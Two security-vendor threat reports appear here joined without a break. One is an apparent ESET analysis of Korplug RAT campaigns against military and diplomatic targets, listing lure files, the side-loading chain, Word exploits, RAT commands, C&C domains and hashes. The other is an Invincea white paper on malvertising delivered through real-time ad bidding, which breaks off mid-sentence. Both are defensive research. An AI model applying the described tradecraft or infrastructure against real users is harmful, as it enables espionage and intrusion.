news.doc                                                 51CDC273B5638E06906BCB700335E288807744B5
План деятельности                Activity plan for
соединений и воинских            military units in the
EA6EE9EAB546FB9F93B75DCB650AF22A95486391
частей Приволжского              Volga region in July
региона на июль 2014 г.scr       2014
Telephone directory
телефонный   справочник             of the Ministry of
D297DC7D29E42E8D37C951B0B11629051EEBE9C0
структуры МИД КР .scr            Foreign Affairs of
the Kyrgyz Republic
О Центре социальной              About the Center for
адаптации                        social adaptation of     8E5E19EBE719EBF7F8BE4290931FFA173E658CB8
военнослужащих.scr               servicemen
Meeting minutes of
Протокол встречи НГШ
the General Staff of     1F726E94B90034E7ABD148FE31EBA08774D1506F
КНР.scr
the PRC
исправленный шаблон плана        Corrected action
A9C627AA09B8CC50A83FF2728A3978492AEB79D8
мероприятий.scr                  plan template
Situation Report about
A9C627AA09B8CC50A83FF2728A3978492AEB79D8
Afghan.scr
Military and political
Военно-политическая              situation in Islamic
обстановка в ИРА                 Republic of             E32081C56F39EA14DFD1E449C28219D264D80B2F
на04.10.2014.scr                 Afghanistan ( IRA )
on 04.10.2014
Afghan Air Force.scr                                   E32081C56F39EA14DFD1E449C28219D264D80B2F
план мероприятий.scr             Action plan            1F726E94B90034E7ABD148FE31EBA08774D1506F
Some of the above - mentioned files also contained decoy documents :
In all of the cases , three binary files were dropped ( apart from decoy documents ) that led to the Korplug
trojan being loading into memory .
exe – a legitimate executable with a Kaspersky digital signature that would load a DLL with a
specific file name
dll – a small DLL loader that would pass execution to the Korplug raw binary code
dll.avp – raw Korplug binary
The Korplug RAT is known to use this side - loading trick by abusing legitimate digitally signed executables
and is a way to stay under the radar , since a trusted application with a valid signature among startup items
is less likely to raise suspicion .
The maliciously crafted documents are RTF files that successfully exploit the CVE-2012 - 0158 vulnerability
in Microsoft Word . The image below shows the beginning of the CVE-2012 - 0158 shellcode in ASCII
encoding within the document ( the opcodes 60 , 55 , 8bec disassemble to pusha ; push ebp ; mov ebp , esp ) .
Interestingly , though , the documents also contain the newer CVE-2014 - 1761 exploit that was extensively
used in targeted attacks carried out by a number other malware families this year ( including BlackEnergy ,
Sednit , MiniDuke , and others ) . However , this exploit is not implemented correctly due to a wrong file
offset in the 1st stage shellcode .
Below we see the disassembly of the 1st stage shellcode where it checks the presence of the tag “ p!11 ”
marking the beginning of the 2nd stage shellcode and loads it into memory . Even though the tag and 2nd
stage shellcode is present in the RTF , it ’s at a different offset , and thus never is loaded .
Sophos’ Gabor Szappanos gives a possible explanation how these malformed samples may have come into
existence .
ESET LiveGrid telemetry indicates that the attacks against these targets have been going on since at least
June 2014 and continue through today .
We were able to pinpoint the targets to residents of the following countries :
Afghanistan
Tajikistan
Russia
Kyrgyzstan
Kazakhstan
From the topics of the files used to spread the malware , as well as from the affected targets , it appears that
the attackers are interested in gathering intelligence related to Afghan , Tajik and Russian military and
diplomatic subjects .
Interestingly , most of the affected victims have another thing in common – a number of other RATs , file
stealing trojans or keyloggers were detected on their systems on top of the Korplug RAT detection . One of
these ‘ alternative RATs’ was connecting to a domain also used by the Korplug samples .
Since the functionality of these tools was partly overlapping with that of Korplug , it left us wondering
whether the attackers were just experimenting with different RATs or were they supplementing some
functionality that they were unable to accomplish .
Additional information about two malware families that were most often found accompanying Korplug
infections is given below .
Alternative Malware # 1 : DarkStRat
A curious Remote Access Trojan , as research points to a Chinese connection but the commands it listens
to are in Spanish ( translation in English ) :
CERRAR ( close )
DESINSTALAR ( uninstall )
SERVIDOR ( server )
INFO
MAININFO
PING
REBOOT
POWEROFF
PROC
KILLPROC
VERUNIDADES ( see units )
LISTARARCHIVOS ( list files )
EXEC
DELFILE
DELFOLDER
RENAME
MKDIR
CAMBIOID ( change ID )
GETFILE / SENDFILE / RESUMETRANSFER
SHELL
SERVICIOSLISTAR ( list service )
INICIARSERVICIO ( start service )
DETENERSERVICIO ( stop service )
BORRARSERVICIO ( erase service )
INSTALARSERVICIO ( install service )
The malware can manage processes and services on the infected machine , transfer files to and from the
C&C server , run shell commands , and so on . It is written in Delphi and connects to
www.dicemention.com . Some samples contain a digital signature by “ Nanning weiwu Technology co.,ltd ” .
Alternative Malware # 2 : File Stealer
This malware , written in C , and contains several functions for harvesting files off the victim ’s hard drive
according to criteria set in the configuration file . Apart from doing a recursive sweep of all logical fixed
and remote drives , it also continually monitors any attached removable media or network shares by
listening to DBT_DEVICEARRIVAL events .
In addition to collecting files , the malware attempts to gather saved passwords , history of visited URLs ,
account information and proxy information from the following applications :
Microsoft Messenger
Microsoft Outlook
Microsoft Internet Explorer
Mozilla Firefox
The C&C domains used by this malware are :
newvinta.com
worksware.net
Some samples of this file stealer detected in these campaigns also contain the signature by “ Nanning
weiwu Technology co.,ltd ” – another indicator that the infections are related .
List of SHA1 hashes :
Korplug :
5DFA79EB89B3A8DDBC55252BD330D04D285F9189
095550E3F0E5D24A59ADD9390E6E17120039355E
5D760403108BDCDCE5C22403387E89EDC2694860
05BFE122F207DF7806EB5E4CE69D3AEC26D74190
548577598A670FFD7770F01B8C8EEFF853C222C7
530D26A9BEEDCCED0C36C54C1BF3CDA28D2B6E62
F6CB6DB20AA8F17769095042790AEB60EECD58B0
EF17B7EC3111949CBDBDEB5E0E15BD2C6E90358F
17CA3BBDDEF164E6493F32C952002E34C55A74F2
973EA910EA3734E45FDE304F20AB6CF067456551
47D78FBFB2EFC3AB9DDC653A0F03D560D972BF67
0B5A7E49987EF2C320864CF205B7048F7032300D
E81E0F416752B336396294D24E639AE86D9C6BAA
E930D3A2E6B2FFDC7052D7E18F51BD5A765BDB90
Alternative Malware # 1 :
FDD41EB3CBB631F38AC415347E25926E3E3F09B6
457F4FFA2FE1CACFEA53F8F5FF72C3FA61939CCD
5B6D654EB16FC84A212ACF7D5A05A8E8A642CE20
7D59B19BD56E1D2C742C39A2ABA9AC34F6BC58D4
D7D130B8CC9BEA51143F28820F08068521763494
01B4B92D5839ECF3130F5C69652295FE4F2DA0C5
02C38EC1C67098E1F6854D1125D3AED6268540DE
Alternative Malware # 2 :
3A7FB6E819EEC52111693219E604239BD25629E9
BF77D0BA7F3E60B45BD0801979B12BEA703B227B
55EF67AFA2EC2F260B046A901868C48A76BC7B72
A29F64CD7B78E51D0C9FDFBDCBC57CED43A157B2
34754E8B410C9480E1ADFB31A4AA72419056B622
17A2F18C9CCAAA714FD31BE2DE0BC62B2C310D8F
6D99ACEA8323B8797560F7284607DB08ECA616D8
1884A05409C7EF877E0E1AAAEC6BB9D59E065D7C
1FC6FB0D35DCD0517C82ADAEF1A85FFE2AFAB4EE
5860C99E5065A414C91F51B9E8B779D10F40ADC4
7950D5B57FA651CA6FA9180E39B6E8CC1E65B746
Research by : Anton Cherepanov
Author Robert Lipovsky , ESET

DETECTION | PREVENTION | INTELLIGENCE
Invincea White Paper
“ Micro - Targeted Malvertising via Real - time Ad Bidding ”
UPDATED : Includes New CryptoWall Malvertising Campaign
Release date : October 27 , 2014
Invincea White Paper
Invincea , Inc.
Invincea White Paper                1
Table of Contents
Executive Summary ............................................................................................................... 2
Introduction .......................................................................................................................... 3
Operation DeathClick : Targeting the US Industrial Base ................................................................... 4
Summary for Incident at Fleaflicker.com ......................................................................................... 4
Summary for Incident at Gpokr.com ............................................................................................... 9
Summary for Webmail.earthlink.net ............................................................................................. 11
Summary of Incidents in Operation DeathClick ............................................................................. 13
Real - Time Bidding Networks : How it works .......................................................................... 13
Malvertisers have Weaponized RTB ............................................................................................. 16
Competitive Service Offerings for RTB .......................................................................................... 16
Major Players in RTB .................................................................................................................... 20
How Malvertisers Get $ $ to Bid on RTB ......................................................................................... 21
Where Malvertisers Host Exploits ................................................................................................. 22
Real World Examples of RTB Malvertising Captured by Invincea .................................................... 23
Ransomware Campaign via Malvertising ............................................................................. 26
Analysis of CryptoWall Malvertising Infections .............................................................................. 27
Central Hosting of Clean Content ......................................................................................... 30
How to Protect Yourself from Micro - targeted Malvertising ................................................. 31
Release Notes ...................................................................................................................... 32
Invincea , Inc.                                                                                     Release Date : 10.27.2014
Invincea White Paper        2
Executive Summary
Most targeted attacks against organizations originate as spear - phish campaigns or watering hole style
web driveby attacks . Within the last six months , Invincea has discovered and stopped targeted
malvertizing attacks against specific companies -- particularly those in the Defense Industrial Base . The
combination of traditional cyber crime methods ( malvertising ) with targeted attacks against Defense
industrials for theft of IP represents another development in the on - going blending of techniques from
cyber crime and advanced threat actors with nation state agendas . We are tracking an on - going campaign
against US Defense companies under the code name Operation DeathClick .
Traditional malvertizing has been an effective but indiscriminate method cyber crime gangs use to
compromise endpoints to perpetrate ad fraud , identity fraud , and banking credential theft . In this new
targeted variation of malvertizing , the perpetrators are attacking specific organizations by leveraging real-
time ad bidding networks and micro - targeting techniques developed over the last decade in online
advertising . The objective of these micro - targeted attacks against the Defense sector is likely theft of
Intellectual Property more than ad fraud and indicates motive and sophistication characteristic of
advanced threat actors . Since these attacks were blocked by Invincea prior to compromise of the machine
or network , we can not confirm the specific IP the perpetrators are after – only the Tactics , Techniques ,
and Protocols ( TTPs ) used which we describe herein , similar to methods used to provide backdoor access
and command and control over compromised networks .
While we discovered these attacks across multiple Defense companies , we expect it will not be long , if
not already , before other highly targeted segments including Federal , Financial Services , Manufacturing ,
and HealthCare are victimized with the same micro - targeted malvertising . The campaign described here
does not represent a single flaw , 0-day , or unpatched bug , but rather a significant development in the
adversary ’s capabilities and strategy to leverage legitimate online advertising platforms on well - known ad
supported websites via a technique called Real - Time Ad Bidding . In other words , this problem will not be
patched on Tuesday .
UPDATE : We have updated this document to include a new section on a campaign of distributing
CryptoWall ransomware via malvertising . While the attack vector is the same , we believe this to be
motivated by cybercrime rather than theft of IP from Defense companies .
Invincea , Inc.                                                              Release Date : 10.27.2014
Invincea White Paper        3
Introduction
Malvertising has seen meteoric rise in 2014 . Threat actors create a corporate front , advertise on
commonly visited sites , then later switch out the landing pages for their ads to pages that host exploit
kits , or simply create a temporary redirection from their usual content to the malicious landing page .
These exploit kits are hosted on compromised web servers across the world . In other words , they leverage
legitimate ad - supported popular websites together with compromised websites for hosting exploit
landing pages , defeating black - listing techniques . The lifetime of these ads and landing pages are
measured in hours .
In the campaign described here , Operation DeathClick , traditional malvertising has been armed with a
micro - targeting system using IP address ranges , geographically narrowed down to zip codes , and interests
of the user ( recorded in cookies ) to target specific companies , company types , and user
interests / preferences . They are employing the tactics of real - time ad bidding to guarantee malicious ad
delivery to intended targets of the campaign – building on a decade of work in real - time analytics for
online ad placement , but for nefarious purposes .
The threat actors redirect their ads for just minutes at a time and then abandon their exploit kit pages
forever . This means that list - based threat intelligence feeds are rendered ineffective . The domains used
do not appear in any proxy blacklist , and the malware droppers delivered by the exploit pages always
employ different signatures , evading traditional network and endpoint detection technology .
Ad delivery networks today are not incentivized to address the problem in a credible manner as they
derive revenue from the criminal enterprise , while not being held accountable . Turning a blind eye to the
problem is rewarded economically . Meanwhile the perpetrators are able to use traditional malvertising
and ad fraud bots to fund the criminal enterprise .
Without cooperation of ad networks to vet the advertisers working through front companies , this attack
vector will go unchecked . And now , with the advent of real - time ad bidding , these threat actors have
weaponized ad delivery networks to target victims based on :
    User - Agent strings ( versions of flash , OS , java and browser )
    Interest - related content ( click bait articles , industry specific software or hardware , like medical
supplies , radar mapping software , ammunition sales , stocks forums )
    Advertising Profiles derived from cookies ( someone with specific tastes , may shop for shoes ,
handbags , cars , luxury vacations )
    Geographic region ( malvertisers can target specific neighborhoods or states via geoip direct
advertising )
    Specific corporate IP ranges ( targeted malvertising can target the public IP space of your network
or an Industrial Vertical )
Invincea , Inc.                                                            Release Date : 10.27.2014
Invincea White Paper        4
Real - time ad bidding allows advertisers , and by extension , adversaries , to micro - target ad delivery on an
extremely granular basis . For example , oppressive regimes trying to gather intelligence on activist
protests can deliver ads to people getting email from within a specific locality where they are protesting .
Today , it is commonplace for micro - targeting techniques to be used as part of the toolset in legitimate
online advertising . For instance , a defense contractor , trying to win a new omnibus contract , can deliver
targeted ads to online news sites frequented by Government program personnel . The latest software
product release can be delivered to Windows users visiting PC Magazine ’s website . A local car dealership
can sense when someone is in the market for a new car and can deliver advertising to those users , based
solely on browsing history .
Now advanced threat actors are able to target an organization directly via micro - targeted malvertising ,
based solely on their corporate network IP range . Thus , it does n’t matter where in the world you point
your web browser -- an online video poker room , a fantasy football club homepage , a Pakistani news
homepage , or even checking your own webmail at a trusted email provider . Those ad windows can and
are being used to deliver malware if the bidding price is right .
Operation DeathClick : Targeting the US Industrial Base
Recently , multiple US Defense / Aerospace contractors were targeted by a malvertising campaign . These
contractors had deployed world - class enterprise security defense in depth approaches to protect their
intellectual property . They had next generation firewalls that relied on threat intelligence feeds to do
auto - blocking of known malicious sites . They had malware interception technology that relied on known
bad hashes to prevent malicious downloads . The multiple proxies in place subscribed to real time feeds
of known bad URLs . They deployed AV at the gateways and on the endpoints .
But in a two week period , these organizations were hit with dozens of micro - targeted malvertising attacks ,
each of which would have provided a beachhead for the threat actors from which to compromise the
network , if successful . In each instance , the attacks were carried out by targeting these Defense
contractors directly via real - time ad bidding . Once targeted , an end user only needed to browse to any
website , anywhere in the world , which contained a DoubleClick ad - partner embedded window . Invincea
stopped these attacks on the endpoints by containing the delivered exploits in secure virtual containers ,
while producing the forensics that led to this discovery .
Next we go in some detail about example attacks perpetrated against the defense firms .
It is important to note that the websites we show next that served up targeted malvertising were victims
of malvertising campaigns with no knowledge of the malicious ads they were serving up . These malicious
ads were served up by 3rd party networks , who are unwittingly sourcing malicious content . As we will
discuss later , the 3rd party ad networks themselves are falling victim to malicious content campaigns .
Summary for Incident at Fleaflicker.com
Invincea , Inc.                                                             Release Date : 10.27.2014
Invincea White Paper        5
A user visited his online fantasy football league homepage at Fleaflicker.com . As soon as the page loaded ,
a malicious ad delivered a backdoor Trojan via a Java - based exploit .
Figure 1 shows a screenshot of the page that was visited . You will notice the two inline ad placements
for DoubleClick ad delivery . The malware delivered came from a compromised Polish website , and
would have installed a generic backdoor Trojan .
Figure 1 : Fleaflicker.com website
Note the prominent ad placements by AdChoice , a DoubleClick affiliate . Figure 2 shows an event tree of
the exploit and malware delivered from an ad by visiting Fleaflicker.com .
Invincea , Inc.                                                            Release Date : 10.27.2014
Invincea White Paper        6
Figure 2 : Event tree for infection from Fleaflicker.com Incident
The event tree in Figure 2 taken from Invincea ’s Threat Management Console shows the exploited Java
process dropped a file called fvJcrgR0.exe , and that it likely came from Pubmatic , an ad delivery network
that allows for real time bidding to deliver ads . In this instance , the Pubmatic server redirected to a Web
server in Poland that dropped the malware . The timeline below shows the exact times and URLs visited .
Figure 3 : Timeline for Fleaflicker.com Incident
Note the number of re - directs from Fleaflicker.com to different outside properties in Figure 3 .
Invincea , Inc.                                                             Release Date : 10.27.2014
Invincea White Paper        7
Figure 4 : Process Launch for Malware fvJcrgR0.exe from Fleaflicker.com Incident
Invincea Threat Management provides a quick way to search for an MD5 hash on third party sites ( see
Figure 4 ) . By clicking the VirusTotal link , the analyst will see the following VirusTotal report in Figure 5 :
Figure 5 : VirusTotal Report for Malware fvJcrgR0.exe from Fleaflicker.com Incident
Invincea , Inc.                                                              Release Date : 10.27.2014
Invincea White Paper        8
From the VirusTotal report in Figure 5 , you will see that this malware is a Trojan backdoor that would likely
be used to download additional malware or to provide remote persistent access to the attacker .
Invincea , Inc.                                                              Release Date : 10.27.2014
Invincea White Paper        9
Summary for Incident at Gpokr.com
An employee at a defense contractor visited a free Texas Poker online game . The Poker site had
advertisements on the page , one of which launched a similar attack as seen in before on other websites
visited by employees at this firm .
Figure 6 : Screenshot of Gpokr.com
It should be noted that Gpokr.com no longer appears to be serving advertisements from their site . At the
time of the incident , as seen in the logs below , an ad window was previously present . In the event tree
shown in Figure 7 , you will see that the winning bid redirected to a direct - to - IP site instead of a site via
domain name . Also , above is the first indication of specific executable DLL files . Searches for these
filenames returned zero results on VirusTotal .
Invincea , Inc.                                                             Release Date : 10.27.2014
Invincea White Paper        10
Figure 7 : Event Tree for Gpokr.com
This event on September 14 ( Figure 8) shows that delivery.first-impression.com redirected directly to an
IP address , not a domain name to deliver its malicious payload . Note the multiple DLL files written to disk
and the spawning of rundll32.exe . At this point , the Invincea - protected host recognized the unauthorized
process and reverted itself to a clean state .
Figure 8 : Timeline View for Event 5 – Gpokr.com
Invincea , Inc.                                                             Release Date : 10.27.2014
Invincea White Paper        11
Summary for Webmail.earthlink.net
In another incident an employee checked their online Earthlink account . When they replied to an email ,
a new ad was loaded on a page that attempted to exploit Java . This malvertising was from the same IP
address seen in other incidents .
Figure 9 : Screenshot of Webmail.earthlink.net
You will notice the inline advertisements on this page in Figure 9 . The event tree in Figure 10 notes that
this was likely a spear - phish attack . The timeline will show that when the user replied to an email , the ads
on the Earthlink page refreshed , dropping the exploit code via Java .
Invincea , Inc.                                                             Release Date : 10.27.2014
Invincea White Paper     12
Figure 10 : Event Tree for Incident 6 Webmail.earthlink.net
Note in the timeline in Figure 11 , how there was a 7 minute gap between the DoubleClick ad redirect and
the delivery.first-impression.com ad . This is an indication that the page was refreshed or the ad was
refreshed on the page . The same exploit IP address from the Gpokr event is present . This event is the
oldest , happening on September 11 .
Figure 11 : Timeline for Incident 6 Webmail.earthlink.net
Invincea , Inc.                                                          Release Date : 10.27.2014
Invincea White Paper        13
Summary of Incidents in Operation DeathClick
The three examples above are samples of the more than two dozen micro - targeted attacks we have
witnessed and blocked as part of Operation DeathClick since mid - September . Defense Industrial Base
customers witnessed micro - targeted malvertising at a rate six times that of comparable private sector
companies with similar defense - in - depth capabilities .
Real - Time Bidding Networks : How it works
We observed in Operation DeathClick that real - time ad bidding networks are being used by criminal
enterprise to target companies with malicious content in order to gain persistent remote access . In
these third - party arrangements , the content is frequently not vetted because billions of impressions are
rendered in real - time . Most of the content is legitimate ads . A small fraction is malicious content linking
to landing pages that infect users . Real - time ad networks are being used , often unwittingly , and some
have taken steps to try and combat malicious use of their networks . The Online Trust Alliance is one such
industry group comprised of major software companies and ad networks working together to try and
address this problem . Our goal in this paper is to shed light on the micro - targeting of companies by
criminal enterprise employing real - time ad networks , and to aid the industry in collectively addressing
this problem .
Real - time ad bidding networks have evolved over the last ten years as a means of micro - targeting
customers with advertising content they are more likely to click - on .
From Wikipedia :
Real - time bidding ( RTB ) refers to the means by which ad inventory is bought and sold on a per-
impression basis , via programmatic instantaneous auction , similar to financial markets.[1 ] With
real - time bidding , advertising buyers bid on an impression and , if the bid is won , the buyer ’s ad is
instantly displayed on the publisher ’s site.[2 ] Real - time bidding lets advertisers manage and
optimize ads from multiple ad - networks by granting the user access to a multitude of different
networks , allowing them to create and launch advertising campaigns , prioritize networks and
allocate advertising stock .
Real - time bidding is a dynamic bidding process where each impression is bid for in ( near ) real time ,
against a static auction where the impressions are typically bundled in groups of 1,000 .
A typical transaction begins with a user visiting a website . This triggers a bid request that can
include various pieces of data such as the user ’s demographic information , browsing history ,
location , and the page being loaded . The request goes from the publisher to an ad exchange ,
which submits it and the accompanying data to multiple advertisers who automatically submit
bids in real time to place their ads . Advertisers bid on each ad impression as it is served . The
Invincea , Inc.                                                             Release Date : 10.27.2014
Invincea White Paper        14
impression goes to the highest bidder and their ad is served on the page . This process is repeated
for every ad slot on the page . Real time bidding transactions typically happen within 100
milliseconds from the moment the ad exchange received the request .
The bidding happens autonomously and advertisers set maximum bids and budgets for an
advertising campaign . The criteria for bidding on particular types of consumers can be very
complex , taking into account everything from very detailed behavioral profiles to conversion data .
The following infographic summarizes how advanced adversaries are now micro - targeting companies
using malvertising .
Invincea , Inc.                                                            Release Date : 10.27.2014
Invincea White Paper    15
Invincea , Inc.    Release Date : 10.27.2014
Invincea White Paper         16
Malvertisers have Weaponized RTB
The marketplace and auction of ads sounds great for actual ads . But what if the landing pages that are
supposed to be ads are actually malicious PHP pages with embedded malware ? The bidding and ad
placements work the same , but instead of seeing a flashy ad banner , the highest bidder for the placement
serves malware . The price to win the bid to push malvertising to any page you happen to visit ranges from
45 to 75 cents per impression .
A malicious advertiser on a network may serve crafted , seemingly normal ads , a majority of the time . In
fact , the ads are often stolen copies from legitimate advertisers . This establishes the attacker ’s legitimacy
and trust on the ad network . Of course with real - time ad bidding , he can simply offer up low bids and his
content would consistently lose in the marketplace . But it is very simple to replace the redirection code
to switch from a legitimate ad banner to a drop site that hosts an exploit kit , typically based on Java , Flash ,
Silverlight , or all three . Once the malvertiser detects that he has several infected hosts , he removes the
redirection code and goes back to serving standard ad banners . He then “ burns ” his temporary exploit kit
drop site , moving his exploits to another location for a new campaign .
This allows the malicious advertiser to perform hit and run attacks , infect whomever he wants at whatever
time he wants , and maintain his presence on the advertising marketplace without drawing undue
attention to his activities .
In the sections below , we will provide highlights of the RTB industry , its targeting capabilities , and show
how malvertisers have been mis - appropriating RTB networks to deliver malware .
Competitive Service Offerings for RTB
The RTB ad networks provide significant micro - targeting capabilities that have long been used to serve
legitimate content to users more likely to click on them . In the following , we describe these capabilities
to show the state of the art in RTB network capabilities . The quoted material below are direct quotes from
Real Time Bidding service providers linked . Emphasis added by Invincea .
Pubmatic :
Audience Targeting : Bid on the audiences most valuable to you . Each impression in the PubMatic
auction can be enhanced with first- and third - party data ; giving buyers targeting capabilities
across display , mobile , tablet and video inventory . Media buyers can also cookie sync with
publisher audiences to incorporate CRM , retargeting and exclusion strategies in their digital
advertising .
Buyers have access to proprietary audience segments either directly through Private Marketplace
deals or through the open market . With hundreds of parameters available to you , PubMatic has
your best audiences waiting for you .
Invincea , Inc.                                                               Release Date : 10.27.2014
Invincea White Paper        17
With PubMatic , buyers are able to access pre - defined vertical or audience packages , seasonal
packages , publisher and/or site - specific inventory packages as well as pre - selected publisher
packages and pricing available in Private Marketplaces .
First - Impression.com
“ First - Impression Buy - Side offers the granular targeting , tracking , and reporting needed to help
our clients make the most of their spend , along with an expert support team to advise when
needed . By leveraging real time buying , First - Impression Buy - Side gives media buyers the full
control to maximize the value of an impression . ”
Could Malvertisers Track Exploits and their cost per impression ? Yes . Many RTB networks provide a
control panel to track advertising campaigns in real - time , along with notifications that bids have been won
and who exactly was served the malware .
Below is a URL redirection log from First - Impression.com from a winning bid by a malvertiser . In the URL
are parameters such as the type of ad , the type of user - agent string of the ad reader specified ( which
discloses browser and java versions ) , whether it is a retargeted ad based off of cookies ( this one was not ) ,
the price paid , which is 65.4 cents , and the notification to the malvertiser that his malvertising was
delivered .
http://delivery.first-
impression.com/delivery?action=serve&ssp_id=3&ssp_wsid=2191400908&dssp_id=100&domain_
id=2191400908&ad_id=748271&margin=0.4&cid=155380&bn = sj14&ip_addr=24.234.123.133&ua=15
40937276&top_level_id=24.234.123.133&second_level_id=1540937276&page = thanhniennews.co
m&retargeted = null&height=90&width=728&idfa = null&android_id = null&android_ad_id = null&bi
d_price=0.654&count_notify=1&win_price=$AAABSMPg1dmFEPqXEZe5_CYviub3uOlabldGew
DoubleClick.net
DoubleClick discusses their targeting capabilities in online documentation . Since they specialize in
knowing the location of their ad windows , they market those ad spaces to the actual advertisers and
malvertisers , along with targeted demographics about the content pages , the visitors to the sites and
more .
To showcase the variety of impression - level data available to buyers , consider the data made
available through a connection to DoubleClick Ad Exchange ’s real - time bidding API . With ADX , a
buyer could consider any of the following data passed from the seller with each impression :
• Ad slot parameters : visibility ( above or below the fold ) , size , excluded creative attributes ,
excluded advertiser URLs , allowed vendor or ad technology .
• Geo parameters : country , region , metro , city .
• Content parameters : site URL , site language , seller network , vertical or category .
Invincea , Inc.                                                             Release Date : 10.27.2014
Invincea White Paper         18
• User parameters : browser , operating system , anonymous cookie ( hashed ) , cookie age .
Just like when considering one type of data , by using the anonymous cookie parameter , buyers
can consider first - party retargeting or third - party audience data from a data provider . However ,
they can go further in the evaluation by looking at more of these parameters . This helps a buyer
learn much more about a particular user and a particular impression , gain a smarter answer to
the three essential questions and make a more data - driven decision .
Twitter , Facebook and other RTB ads can now target mobile devices by their phone
numbers .
This sounds like a great way to advertise if you are in the marketing industry . Consider how granularly a
person can be targeted if this service is used maliciously . If not targeted by the desktop , how about on
the mobile platform ?
Twitter ’s Tailored Audiences just got a little more tailored .
Advertisers can now augment their customer data using mobile advertising IDs and mobile
phone numbers as a way to reach existing customers and increase audience size . In essence , the
move is an extension of Twitter ’s Tailored Audiences for CRM retargeting , which allows advertisers
to use hashed non - PII email address to retarget existing customers . ( email addresses are twitter
IDs- so you could be targeted for ad delivery based on your account name or known phone
number )
Twitter also rolled out the ability to target lookalike audiences , a function that seems pretty similar
to Facebook ’s tool of the same name . Twitter ’s lookalike modeling uses a proprietary algorithm
that examines modeled users looking for similarities related to behaviors , interests , location ,
demographic attributes and engagement patterns .
Twitter described its enhanced as “ part of improved targeting options to help advertisers reach
additional users similar to their existing audiences . ”
Tailored Audiences , Twitter ’s seeming answer to the Facebook Exchange ( FBX ) , officially launched
back in December after running retargeting and database matching tests in July . Twitter has
appeared to follow Facebook ’s lead with a number of its recent roll - outs , including site retargeting ,
CRM targeting and now retargeting via lookalike audiences . ( Facebook also makes it possible to
target users by phone numbers through Custom Audiences . )
Neustar.biz
Neustar does provide a real - time bidding ad exchange , but their real market is IP intelligence that they
sell to other advertising networks for the purposes of better targeting specific users . In Europe , laws
require that advertising networks allow people to opt out of having tracking cookies , which is how many
advertisers used to rely upon for ad campaign targeting . To get around this , Neustar perfected IP based
targeting , which avoids cookies . They are able to build IP specific browsing profiles based on IP subnets .
In a blog post below , Neustar boasts about their direct to IP range and enterprise advertising .
Invincea , Inc.                                                               Release Date : 10.27.2014
Invincea White Paper        19
How can Neustar IP Intelligence target by IP ?
While IP intelligence has been around for many years , the ability to effectively target advertising
by audience , based on IP is very new . Neustar IP Intelligence is currently working with select DSP
platforms to buy impressions off of the exchanges based on the IP address rather than cookies .
This has only been possible with the recent emergence of real time bidding ( RTB ) . The secret
sauce is in understanding the IP and the methodology necessary for targeting ads appropriately
against it .
Is an IP Address like a cookie ?
No , an IP address only identifies devices on a network . The IP address does not contain any PII and
does not track or store any consumer usage or behavioral information . ( But IP ranges are
registered by IANA , and you can easily know who owns the ranges )
Product Specific Questions
Q1 : How does the process work ?
The process works exactly like any advertising network . Instead of buying inventory based on a
cookie , Neustar is buying inventory based on an IP address . We run the targeting specifics against
our proprietary database and create a custom IP list to target against . Neustar has set up
relationships with partners that have built the functionality for this to work end - to - end for our
advertisers .
Neustar offers a full service ad network . Brand marketers who wish to advertise using IP Audience
Targeting can work directly with Neustar to determine custom IP placements , run campaigns ,
optimization , reporting and billing . Much like any traditional online publisher or online ad network ,
Neustar manages the entire process .
How does Neustar deliver its ads ?
We use industry standard methods for delivering our ads , but what makes our approach special is
that we bake in the IP data before delivering the inventory with our network partners , which
allows us to target display ad campaigns to a specific business or organization . We obtain
inventory from ad exchanges , but have our own ad server .
Zedo
Zedo , blamed for recent malvertising via DoubleClick , say they are now trying to protect against
malvertisers in this blog here . Less than a week after this announcement , they published another blog
post that describes how they can push advertising to specific platforms , devices , as well as specific markets
and networks :
ZEDO Advertising Technology Updates – September 2014
Device Targeting
Users can now target ads to a specific device when trafficking ads . An option for “ Device
Targeting ” is now available under “ Targeting ” . A creative targeted to a specific Device will serve
only on that Device . All major manufacturers / models are supported by this feature . If a creative is
not targeted to any specific device than it will serve on all device .
Invincea , Inc.                                                              Release Date : 10.27.2014
Invincea White Paper       20
Figure 13 : Targeting by Device Manufacturer / Model
Apart from device , a user can target various devices based on different categories . At any given
point of time , a user can target multiple manufacturers and categories .
Figure 14 : Targeting by Device Category
Reach Report by Creative
Apart from existing campaign reach report a user can now pull a reach report by creative . The
creative reach report is available along with all the existing parameters and can be pulled by
month , week or day . Creative reach report will show creative wise reach . It will help to analyze
how effective the reach of a creative was .
Major Players in RTB
Invincea , Inc.                                                          Release Date : 10.27.2014
Invincea White Paper         21
To be clear , RTB networks are legitimate platforms for displaying ads on ad - supported websites . They
enable micro - targeting of user ’s interest , delivering content that a viewer would likely want to see . As we
have detailed here , they can also be mis - appropriated unwittingly by malvertisers using these same tools
and techniques to target companies with malware for persistent remote access in addition to traditional
click fraud , phishing , and identity theft .
Below are links to RTB providers to learn more .
http://www.sovrn.com/
http://www.turn.com/
http://indexexchange.com/
https://www.dataxu.com/
http://www.sitescout.com/rtb/
http://first-impression.com/home/
http://www.zedo.com/
How Malvertisers Get $ $ to Bid on RTB
Invincea has shown logs from a winning malvertising bid in the price range of 65 cents per impression .
That is one ad , on one page , paid for by the malvertiser ’s account . This implies that malvertisers have
deep pockets , spending hundreds of dollars on ad impressions . So how do they get money to spend on
these malicious campaigns ?
Invincea recently saw a malvertiser win a bid and delivered a Java exploit . This exploit copied a fully
functional version of Chrome into the Java cache directory , and that version of Chrome launched in the
background and proceeded to visit websites and click on specific ad banners . It is presumed that these
ad banners paid revenue via referral bonuses to the malvertiser . By paying 65 cents to install a
background web browser that does nothing but click fraud , the malvertiser is able to reap hundreds if not
thousands of dollars in advertising referral income . It is a pretty good return on investment , which in turn
allows the malvertiser to fund his micro - targeted malvertising attack campaign .
It is ironic , however , that click fraud is what is driving the prices of RTB advertising so high . Malvertising
is not only a danger to end users , but it is a danger to the advertising industry as well . The image from
Figure 14 below shows a log file of Chrome , in this instance , renamed Oajvliewxpge.exe , injected via Java
to run in the background . Invincea detected this attack and killed the infection attempt . This is one
instance where the malvertiser wasted his 65 cents .
Invincea , Inc.                                                               Release Date : 10.27.2014
Invincea White Paper        22
Figure 16 : Event tree of click fraud malvertising exploit
It should be noted that Invincea is uniquely capable of stopping this type of attack . The introduction of
Chrome as a browser , which is whitelisted by hash across the AV industry , would go unchecked by the AV
and whitelisting applications industry . In this instance , the host was almost converted to a click - fraud bot .
But the malware delivery could have been intended for data exfiltration , banking Trojans , or any other
more insidious purpose .
Where Malvertisers Host Exploits
The ability for advertisers and malvertisers to automatically redirect to self - hosted ad content or exploit
